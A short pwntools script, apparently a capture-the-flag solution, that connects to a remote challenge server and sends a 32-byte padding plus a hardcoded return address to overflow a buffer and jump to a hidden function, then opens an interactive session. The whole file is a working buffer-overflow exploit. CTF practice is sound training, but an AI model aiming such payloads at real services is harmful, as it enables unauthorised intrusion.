#!/usr/bin/env python3
from pwn import *

HOST = "pwn.citeflag.online"
PORT = 28621

context.log_level = 'debug'

conn = remote(HOST, PORT)

legendary_saiyan_addr = 0x401244

payload = b"A" * 32
payload += p64(legendary_saiyan_addr)

conn.recvuntil(b"Enter hero name for new student: ")
conn.sendline(payload)

conn.interactive() 